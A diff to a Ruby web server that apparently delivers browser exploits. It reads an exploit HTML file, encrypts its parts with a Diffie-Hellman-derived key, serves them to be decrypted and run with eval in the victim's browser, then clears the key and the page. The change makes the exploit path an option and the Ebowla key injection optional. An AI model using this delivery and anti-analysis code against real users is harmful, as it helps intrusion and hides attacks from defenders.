@@ -224,7 +224,7 @@ end
 # This helper function parses the Request-Line and
 # generates a path to a file on the server.
 
-def requested_file(request_line, full_req,dh_key_pair)
+def requested_file(request_line, full_req,dh_key_pair, options, use_ebowla_payload)
 
   request_uri  = request_line.split(" ")[1]
   path         = URI.unescape(URI(request_uri).path)
@@ -272,17 +272,15 @@ def requested_file(request_line, full_req,dh_key_pair)
     dh_key_pair.add_client_pub(client_pub_point)
     shared_key = dh_key_pair.server_key.dh_compute_key(dh_key_pair.client_pub)
     cipher = Gibberish::AES.new([shared_key].pack("m0"),{iter: 101})
-
-    doc = Nokogiri::HTML(open(exploit))
+    puts options[:exploit] 
+    doc = Nokogiri::HTML(open(options[:exploit]))
     doc_objects = Array.new
     doc_objects = parse_html(doc)
-
     head_static = Array.new
     head_docwrite_enc = Array.new
     head_eval_enc = Array.new
     body_docwrite_enc = Array.new
     body_eval_enc = Array.new
-
     for i in doc_objects
       if i[0] == 'head'
         if i[1] == 'static'
@@ -341,9 +339,11 @@ def requested_file(request_line, full_req,dh_key_pair)
       body = body << 'eval(sjcl.decrypt(sessionStorage.SK_base64,\''+ i +'\'));' << "\n"
     end
 
-    egg_code = dh_phase2(cipher,"var myegg='" + EBOWLA_KEY + "';")
-    body = body << 'eval(sjcl.decrypt(sessionStorage.SK_base64,\''+ egg_code +'\'));' << "\n"
-    
+    if use_ebowla_payload
+        egg_code = dh_phase2(cipher,"var myegg='" + EBOWLA_KEY + "';")
+        body = body << 'eval(sjcl.decrypt(sessionStorage.SK_base64,\''+ egg_code +'\'));' << "\n"
+    end
+
     #clear the session key from the client, no longer needed
     body = body <<  "sessionStorage.SK_base64='xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx';";
     #remove full DOM
@@ -419,7 +419,7 @@ loop do
 
       unless request_line.nil?
         #do special things when a resource is requested
-        path, dh_key_pair_temp = requested_file(request_line,full_req, dh_key_pair)
+        path, dh_key_pair_temp = requested_file(request_line,full_req, dh_key_pair, options, use_ebowla_payload)
 
         if dh_key_pair_temp != 0
           dh_key_pair = dh_key_pair_temp
